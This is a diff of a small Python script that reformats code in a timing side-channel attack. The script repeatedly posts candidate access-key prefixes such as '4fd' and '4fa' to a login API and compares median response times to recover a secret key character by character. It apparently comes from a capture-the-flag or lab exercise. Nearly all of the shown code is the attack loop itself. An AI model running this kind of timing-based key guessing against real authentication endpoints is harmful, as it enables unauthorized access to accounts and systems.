@@ -7,7 +7,7 @@ AUTH_API = f"{BASE_URL}/api/auth/login"
 session = requests.Session()
 
 # The top 3 candidates we've seen so far for the first 3 characters
-candidates = ["4fd", "4fa", "47a", "4fe"] 
+candidates = ["4fd", "4fa", "47a", "4fe"]
 
 print("[*] Running Deep Verification (20 iterations each)...")
 
@@ -19,8 +19,9 @@ for cand in candidates:
         try:
             session.post(AUTH_API, json={"accessKey": cand}, timeout=5)
             times.append(time.perf_counter() - start)
-        except: pass
-    
+        except:
+            pass
+
     med = statistics.median(times)
     results[cand] = med
     print(f" Candidate '{cand}': {med:.4f}s")
